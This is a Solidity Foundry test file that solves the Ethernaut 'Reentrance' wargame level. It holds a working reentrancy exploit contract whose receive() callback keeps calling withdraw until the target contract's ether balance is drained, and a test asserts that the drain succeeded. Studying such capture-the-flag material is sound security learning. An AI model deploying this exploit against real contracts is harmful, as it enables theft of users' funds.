pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Reentrance } from "src/Reentrance/Reentrance.sol";
import { ReentranceFactory } from "src/Reentrance/ReentranceFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract ReentranceExploit {
    address payable victim;

    constructor(address _victim) {
        victim = payable(_victim);
    }

    function attack(uint256 amount) external {
        (bool success,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success);
    }

    receive() external payable {
        if (victim.balance == 0) {
            return;
        }
        (bool success,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", victim.balance));
        require(success);
    }
}

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testReentranceHack() external {
        // level setup
        ReentranceFactory factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        Reentrance reentrancy = Reentrance(payable(levelAddress));

        // attack
        ReentranceExploit exploit = new ReentranceExploit(address(reentrancy));
        reentrancy.donate{ value: 1 ether }(address(exploit));
        exploit.attack(1 ether);
        assertEq(address(reentrancy).balance, 0);

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
